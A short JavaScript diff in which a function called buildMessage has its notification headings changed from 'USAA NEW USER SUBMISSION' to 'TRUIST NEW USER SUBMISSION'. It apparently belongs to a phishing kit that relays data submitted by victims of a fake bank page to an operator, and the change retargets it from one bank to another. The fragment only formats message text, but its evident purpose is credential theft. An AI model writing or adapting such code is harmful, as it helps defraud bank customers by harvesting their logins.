@@ -370,10 +370,10 @@ async function buildMessage(data, options = {}) {
     let heading;
 
     if (hasEmailOrUsername) {
-      heading = `👤 USAA NEW USER SUBMISSION`;
+      heading = `👤 TRUIST NEW USER SUBMISSION`;
     } else {
       const display = identifier || userId;
-      heading = `👤 USAA SUBMISSION\n\n USER: @${display}`;
+      heading = `👤 TRUIST SUBMISSION\n\n USER: @${display}`;
     }
 
     let message = `${heading}\n\n`;
